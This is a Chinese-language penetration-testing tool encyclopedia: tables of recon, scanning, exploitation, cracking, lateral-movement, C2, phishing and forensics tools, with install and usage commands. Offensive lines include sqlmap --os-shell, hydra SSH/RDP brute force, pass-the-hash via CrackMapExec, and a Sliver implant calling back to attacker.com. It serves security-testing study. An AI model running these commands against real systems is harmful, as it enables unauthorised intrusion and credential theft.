# 工具链全攻略

> 从信息收集到后利用，最全面的渗透测试工具百科全书

---

## 一、信息收集工具

### 1.1 子域名枚举

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Subfinder | Go | 快速/多源API | `go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| Amass | Go | 深度/被动+主动 | `go install -v github.com/OWASP/Amass/v3/...@master` |
| Assetfinder | Go | 简单快速 | `go install github.com/tomnomnom/assetfinder@latest` |
| Findomain | Rust | 多源/API | `cargo install findomain` |
| puredns | Go | DNS解析/验证 | `go install github.com/d3mondev/puredns/v2@latest` |
| dnsx | Go | DNS查询 | `go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| massdns | C | 批量DNS解析 | `git clone && make` |
| shuffledns | Go | 批量DNS | `go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest` |

```bash
# 最佳实践：多工具合并
subfinder -d target.com -o sub1.txt
amass enum -d target.com -o sub2.txt
assetfinder --subs-only target.com | tee sub3.txt
cat sub*.txt | sort -u | httpx -o live_subs.txt
```

### 1.2 端口扫描

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Nmap | C | 功能最全/脚本引擎 | `apt install nmap` |
| Masscan | C | 极速扫描/10Mpps | `apt install masscan` |
| RustScan | Rust | 快速/自适应 | `cargo install rustscan` |
| Naabu | Go | 快速/集成ProjDis | `go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest` |
| Zmap | C | 全网扫描 | `apt install zmap` |

```bash
# 高效扫描
nmap -sC -sV -O -p- -T4 target -oA full_scan
masscan target -p0-65535 --rate=10000 -oG masscan.txt
rustscan -a target -- -sC -sV
naabu -host target -p - -rate 1000 -o ports.txt
```

### 1.3 HTTP探测

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| httpx | Go | HTTP探测/截图 | `go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| httprobe | Go | 简单探测 | `go install github.com/tomnomnom/httprobe@latest` |
| gowitness | Go | 网页截图 | `go install github.com/sensepost/gowitness@latest` |
| aquatone | Go | 截图/分析 | `go install github.com/michenriksen/aquatone@latest` |

```bash
cat subs.txt | httpx -title -status-code -tech-detect -o live.txt
cat subs.txt | httprobe -c 50 -t 3000 | tee live.txt
gowitness file -f live.txt -P screenshots/
```

### 1.4 指纹识别

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| WhatWeb | Ruby | 全面指纹 | `apt install whatweb` |
| Wappalyzer | Node | 浏览器扩展 | `npm i wappalyzer` |
| wafw00f | Python | WAF识别 | `pip install wafw00f` |
| nuclei | Go | 漏洞+指纹 | `go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest` |

### 1.5 目录爆破

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| ffuf | Go | 最快模糊测试 | `go install github.com/ffuf/ffuf@latest` |
| gobuster | Go | 目录/DNS/虚拟主机 | `go install github.com/OJ/gobuster/v3@latest` |
| dirsearch | Python | 多扩展/递归 | `git clone && python3 dirsearch.py` |
| Dirb | C | 基础扫描 | `apt install dirb` |

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 100 -c
gobuster dir -u https://target.com -w wordlist.txt -x php,asp,aspx -t 50
dirsearch -u https://target.com -e php,asp -r -R 2
```

---

## 二、漏洞扫描工具

### 2.1 Web扫描

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Nuclei | Go | 模板化/YAML | `go install` |
| Nikto | Perl | 传统Web扫描 | `apt install nikto` |
| Skipfish | C | Google出品 | `apt install skipfish` |
| WPScan | Ruby | WordPress专用 | `gem install wpscan` |
| JoomScan | Perl | Joomla专用 | `git clone` |
| Drupwn | Python | Drupal专用 | `pip install drupwn` |

### 2.2 漏洞框架

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Metasploit | Ruby | 最全利用框架 | `apt install metasploit-framework` |
| ExploitDB | - | 漏洞数据库 | `apt install exploitdb` |
| SearchSploit | Bash | 本地搜索Exp | `searchsploit` |
| Pocsuite3 | Python | PoC框架 | `pip install pocsuite3` |
| Vulmap | Python | 漏洞扫描 | `pip install vulmap` |

```bash
msfconsole -q
search type:exploit platform:windows cve:2021
use exploit/windows/smb/ms17_010_eternalblue
searchsploit tomcat 9
nuclei -l targets.txt -t cves/ -severity critical,high
```

### 2.3 网络扫描

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| OpenVAS/GVM | C | 全面漏洞扫描 | `apt install gvm` |
| Nessus | - | 商业扫描器 | nessus.org |
| Nexpose | - | Rapid7商业 | rapid7.com |
| Qualys | - | 云扫描 | qualys.com |

---

## 三、利用工具

### 3.1 SQL注入

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| SQLMap | Python | 自动化SQL注入 | `apt install sqlmap` |
| jSQL | Java | GUI工具 | github.com/ron190/jsql-injection |
| NoSQLMap | Python | NoSQL注入 | `git clone` |

```bash
sqlmap -u "http://target.com?id=1" --batch --random-agent --level 3 --risk 2
sqlmap -r request.txt --batch --tamper=space2comment
sqlmap -u "http://target.com?id=1" --os-shell
```

### 3.2 XSS

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| XSStrike | Python | 智能XSS检测 | `git clone` |
| Dalfox | Go | 快速XSS扫描 | `go install github.com/hahwul/dalfox/v2@latest` |
| XSSer | Python | XSS框架 | `apt install xsser` |
| BeEF | Ruby | XSS利用框架 | `git clone` |

### 3.3 命令执行

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Commix | Python | 命令注入检测 | `git clone` |
| Fuxploider | Python | 文件上传检测 | `git clone` |

### 3.4 SSRF

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| SSRFmap | Python | SSRF利用 | `git clone` |
| Gopherus | Python | Gopher协议生成 | `pip install gopherus` |
| Interactsh | Go | 带外检测 | `go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` |

---

## 四、代理与抓包

### 4.1 代理工具

| 工具 | 语言 | 特点 | 价格 |
|:-----|:-----|:-----|:-----|
| Burp Suite | Java | 最全Web代理 | 社区版免费/专业版付费 |
| OWASP ZAP | Java | 开源代理 | 免费 |
| mitmproxy | Python | CLI代理 | 免费 |
| Charles | Java | 友好UI | 付费 |
| Fiddler | .NET | Windows原生 | 免费 |
| Proxyman | Swift | macOS原生 | 付费 |

```bash
# mitmproxy
mitmproxy -p 8080
mitmweb -p 8080  # Web界面
mitmdump -s script.py  # 脚本处理

# Burp Suite CLI
burpsuite --project=project.burp --config-file=config.json
```

### 4.2 抓包工具

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Wireshark | C | 网络分析 | `apt install wireshark` |
| tcpdump | C | CLI抓包 | `apt install tcpdump` |
| tshark | C | CLI Wireshark | `apt install tshark` |
| ngrep | C | 正则抓包 | `apt install ngrep` |

---

## 五、密码工具

### 5.1 密码爆破

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Hydra | C | 多协议爆破 | `apt install hydra` |
| John | C | 哈希破解 | `apt install john` |
| Hashcat | C | GPU破解 | `apt install hashcat` |
| Medusa | C | 并行爆破 | `apt install medusa` |
| Ncrack | C | 网络认证爆破 | `apt install ncrack` |
| THC-pptp-bruter | C | PPTP爆破 | `apt install thc-pptp-bruter` |

```bash
hydra -l admin -P passwords.txt ssh://target
hydra -L users.txt -P passwords.txt -t 4 rdp://target
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
john --format=nt --wordlist=rockyou.txt hashes.txt
```

### 5.2 凭证提取

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Mimikatz | C | Windows凭证 | github.com/gentilkiwi/mimikatz |
| LaZagne | Python | 多平台密码 | github.com/AlessandroZ/LaZagne |
| Windows Credentials Editor | C | 凭证编辑 | ampelorez |
| ntdsxtract | Python | NTDS提取 | github.com/csababarta/ntdsxtract |

### 5.3 字典生成

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Crunch | C | 字典生成 | `apt install crunch` |
| KWPROCESSOR | C | 字典处理 | |
| CUPP | Python | 智能字典 | `pip install cupp` |
| Mentalist | .NET | 图形字典 | github.com/sc0tfree/mentalist |
| PACK (Password Analysis and Cracking Kit) | Python | 密码分析 | github.com/iphelix/pack |

```bash
crunch 8 12 abc123 -o wordlist.txt
cupp -i  # 交互式字典生成
python3 maskprocessor.py ?l?l?l?l?l?l?d?d
```

---

## 六、内网渗透工具

### 6.1 横向移动

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| CrackMapExec | Python | 自动化横向 | `pip install crackmapexec` |
| NetExec | Python | CME替代 | github.com/Pennyw0rth/NetExec |
| Impacket | Python | AD协议工具 | `pip install impacket` |
| PsExec | - | Sysinternals | Microsoft |
| Evil-WinRM | Ruby | WinRM Shell | `gem install evil-winrm` |
| PowerSploit | PowerShell | PowerShell攻击 | github.com/PowerShellMafia/PowerSploit |

```bash
cme smb 192.168.1.0/24 -u user -p pass
cme smb target -u Administrator -H HASH -x whoami
impacket-psexec DOMAIN/user:pass@target
evil-winrm -i target -u user -p pass
```

### 6.2 代理隧道

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| Frp | Go | 内网穿透 | github.com/fatedier/frp |
| Chisel | Go | HTTP隧道 | github.com/jpillora/chisel |
| Ligolo | Go | 多级代理 | github.com/sysdream/ligolo |
| Neo-reGeorg | Python | Web隧道 | github.com/L-codes/Neo-reGeorg |
| EarthWorm | C | 端口转发 | github.com/idlefire/ew |
| Stunnel | C | SSL隧道 | `apt install stunnel4` |
| Socat | C | 多功能转发 | `apt install socat` |
| ngrok | Go | 公网映射 | ngrok.com |

### 6.3 域渗透

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| BloodHound | JS/Python | AD关系分析 | github.com/BloodHoundAD/BloodHound |
| Sharphound | C# | BH收集器 | github.com/BloodHoundAD/SharpHound |
| Rubeus | C# | Kerberos攻击 | github.com/GhostPack/Rubeus |
| Certipy | Python | ADCS攻击 | github.com/ly4k/Certipy |
| ADExplorer | - | AD浏览器 | Microsoft Sysinternals |
| PingCastle | .NET | AD风险评估 | pingcastle.com |

---

## 七、C2框架

| 框架 | 语言 | 特点 | 价格 |
|:-----|:-----|:-----|:-----|
| Cobalt Strike | Java | 商业最强 | $3500+/年 |
| Metasploit | Ruby | 免费/开源 | 免费 |
| Sliver | Go | 开源C2 | 免费 |
| Havoc | C++ | 现代C2 | 免费 |
| Covenant | C# | .NET C2 | 免费 |
| Brute Ratel | C | 反检测C2 | 付费 |
| Nighthawk | C# | 商业C2 | 付费 |
| Mythic | Python | 多代理C2 | 免费 |
| Viper | Python | 可视化C2 | 免费 |
| PoshC2 | PowerShell | PS C2 | 免费 |

```bash
# Sliver
sliver-server
[server] generate --http attacker.com --os windows --save implant.exe
[server] https

# Covenant
dotnet run --project Covenant/Covenant.csproj
```

---

## 八、移动安全工具

### 8.1 Android

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| APKTool | Java | APK反编译 | `apt install apktool` |
| JADX | Java | DEX→Java | `apt install jadx` |
| Frida | Python/JS | 动态插桩 | `pip install frida-tools` |
| Objection | Python | 移动安全 | `pip install objection` |
| MobSF | Python | 自动化扫描 | github.com/MobSF/Mobile-Security-Framework-MobSF |
| Drozer | Java/Python | Android安全 | github.com/FSecureLABS/drozer |
| Androguard | Python | 逆向分析 | `pip install androguard` |

### 8.2 iOS

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| class-dump | C | Obj-C头文件 | github.com/nygard/class-dump |
| Hopper | - | 反汇编器 | hopperapp.com |
| Cycript | JS | 运行时注入 | cycript.org |
| Needle | Python | iOS测试 | github.com/FSecureLABS/needle |
| Keychain-dumper | C | Keychain提取 | github.com/ptoomey3/Keychain-Dumper |

---

## 九、社会工程工具

| 工具 | 语言 | 特点 | 安装 |
|:-----|:-----|:-----|:------|
| SET | Python | 社工工具包 | `apt install set` |
| GoPhish | Go | 钓鱼平台 | getgophish.com |
| EvilGinx2 | Go | MFA绕过钓鱼 | github.com/kgretzky/evilginx2 |
| Modlishka | Go | 反代钓鱼 | github.com/drk1wi/Modlishka |
| SocialFish | Python | 钓鱼框架 | github.com/UndeadSec/SocialFish |
| King Phisher | Python | 钓鱼模拟 | github.com/securestate/king-phisher |
| Wifiphisher | Python | WiFi钓鱼 | github.com/wifiphisher/wifiphisher |

---

## 十、逆向工具

| 工具 | 平台 | 特点 | 价格 |
|:-----|:-----|:-----|:-----|
| IDA Pro | Win/Lin/Mac | 最强反汇编 | $2299+ |
| Ghidra | 跨平台 | NSA开源 | 免费 |
| Binary Ninja | 跨平台 | 现代UI | $299+ |
| Radare2 | 跨平台 | CLI逆向 | 免费 |
| x64dbg | Windows | 调试器 | 免费 |
| OllyDbg | Windows | 传统调试 | 免费 |
| WinDbg | Windows | 内核调试 | 免费 |
| Immunity Debugger | Windows | Exploit调试 | 免费 |
| Hopper | macOS | macOS逆向 | $99+ |

---

## 十一、取证工具

| 工具 | 平台 | 特点 | 价格 |
|:-----|:-----|:-----|:-----|
| Autopsy | 跨平台 | 磁盘取证 | 免费 |
| Volatility | 跨平台 | 内存取证 | 免费 |
| FTK Imager | Windows | 镜像制作 | 免费 |
| Rekall | 跨平台 | 内存分析 | 免费 |
| Scalpel | 跨平台 | 文件雕刻 | 免费 |
| Foremost | 跨平台 | 文件恢复 | 免费 |
| Binwalk | 跨平台 | 固件分析 | 免费 |
| Wireshark | 跨平台 | 网络取证 | 免费 |
| Plaso | Python | 时间线分析 | 免费 |
| Sleuth Kit | 跨平台 | 磁盘分析 | 免费 |

---

## 十二、综合环境

### 12.1 渗透测试发行版

| 发行版 | 基础 | 特点 |
|:-------|:-----|:-----|
| Kali Linux | Debian | 最流行的渗透发行版 |
| Parrot OS | Debian | 安全+隐私 |
| BlackArch | Arch | 最大工具集(2500+工具) |
| REMnux | Ubuntu | 恶意软件分析 |
| Flare VM | Windows | 恶意软件分析 |
| Commando VM | Windows | 渗透测试 |
| Pentoo | Gentoo | 高性能渗透 |
| AttifyOS | Ubuntu | IoT安全 |

### 12.2 工具管理器

```bash
# Kali工具管理
kali-tools list
kali-tools install metasploit
apt-cache search kali-linux

# BlackArch
pacman -S blackarch-*
blackarch-install

# pip
pip install -r requirements.txt

# Go
go install -v github.com/projectdiscovery/...
```

### 12.3 Docker工具镜像

```dockerfile
# 一键渗透环境
FROM kalilinux/kali-rolling

RUN apt-get update && apt-get install -y \
    kali-linux-headless \
    metasploit-framework \
    nmap \
    sqlmap \
    hydra \
    john \
    gobuster \
    ffuf \
    wireshark \
    && apt-get clean

RUN pip install --upgrade pip && \
    pip install crackmapexec impacket sqlalchemy pymysql pycryptodomex

CMD ["/bin/bash"]
```

### 12.4 推荐工具列表

```bash
# 渗透测试必装工具箱

# 信息收集
subfinder, amass, httpx, naabu, nmap, ffuf, nuclei, whatweb

# 漏洞利用
metasploit, sqlmap, searchsploit, hydra, john

# 内网渗透
crackmapexec, impacket, chisel, bloodhound, evil-winrm

# Web代理
burpsuite, mitmproxy

# 移动安全
apktool, jadx, frida, objection

# 代码审计
semgrep, sonar-scanner, bandit

# 辅助
jq, curl, netcat, socat, proxychains4

# 安装脚本
pip install crackmapexec impacket evil-winrm
go install -v github.com/projectdiscovery/...@latest
```

---

> **参考资源**
>
> - Kali Linux Tools Documentation
> - BlackArch Tool List
> - GitHub Awesome-Hacking
> - ProjectDiscovery Documentation
> - Offensive Security Tools
